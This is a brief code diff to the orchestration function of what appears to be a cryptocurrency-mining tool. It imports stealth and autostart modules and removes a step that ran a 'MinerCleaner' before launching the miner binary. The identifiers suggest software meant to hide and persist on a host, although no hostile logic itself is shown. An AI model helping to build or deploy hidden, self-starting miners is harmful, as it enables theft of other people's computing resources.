@@ -123,12 +123,7 @@ def _orchestrate():
     from core.stealth import StealthConfig
     from core.autostart import AutoStart
     from core.dashboard import DashboardServer
-    from core.cleaner import MinerCleaner
-
     try:
-        cleaner = MinerCleaner()
-        cleaner.run_full_clean()
-
         mgr = MinerManager(BASE_DIR)
         mgr.ensure_binary()
 
